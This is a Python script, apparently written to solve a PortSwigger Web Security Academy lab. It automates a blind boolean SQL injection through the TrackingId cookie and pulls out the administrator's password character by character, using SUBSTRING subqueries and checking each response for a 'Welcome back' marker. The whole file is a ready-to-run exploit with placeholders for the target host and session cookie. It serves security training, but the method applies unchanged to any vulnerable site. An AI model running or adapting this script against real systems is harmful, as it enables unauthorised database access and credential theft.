import requests as req
import os

"""
By: bielzao
"""

# function to prepare the headers
def makeHeaders(payload):
	cookies = {
		'TrackingId' : f"TRACKING-ID-HERE' AND {payload}",  # change this
		'session':'SESSION-COOKIE-HERE'  # change this
	}

	headers = {
		# Ex: 'Host':'0a5600ee03e8124c89d692b0006c00f1.web-security-academy.net',
		'Host':'URL-LAB-HERE',  # change this
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
		'Accept-Language':'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding':'gzip, deflate, br',
		'Referer':'https://portswigger.net/',
		'Upgrade-Insecure-Requests':'1',
		'Sec-Fetch-Dest':'document',
		'Sec-Fetch-Mode':'navigate',
		'Sec-Fetch-Site':'cross-site',
		'Sec-Fetch-User':'?1',
		'Te':'trailers'
	}

	# groups the request information 
	info = [
		cookies,
		headers
	]

	return info

def main():
	wordlist = [
		'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
		'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
		'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6',
		'7', '8', '9', '10'
	]

	password = ''  # password that will be found
	count = 1  # will be used as counter and index to the password char

	# if you are using Linux, change 'cls' for 'clear'
	os.system('cls')
	print("[*] Executing...")

	while count <= 21:
		for c in wordlist:
			# change this if you want to send a different payload
			payload = f"(SELECT SUBSTRING(password, {count}, 1) FROM users WHERE username='administrator')='{c}"
			cookies, headers =  makeHeaders(payload)

			# send the request
			response = req.get(
				'https://URL-LAB-HERE/',  # change this
				 headers=headers,
				 cookies=cookies
			)

			# divides the request response into spaces
			words = response.text.split()

			# flag to determine whether "Welcome back!" is present in the response.
			word_is_present = False 
			for word in words:
				if word == 	'<div>Welcome':
					word_is_present = True
					break

			if word_is_present:
				# if you are using Linux, change 'cls' for 'clear'
				os.system('cls')
				print(f"Password: {password}", end='')
				password += c;

		count+=1

	print("\n")
	print(f"[+] Password found: {password}")


if __name__ == '__main__':
	main()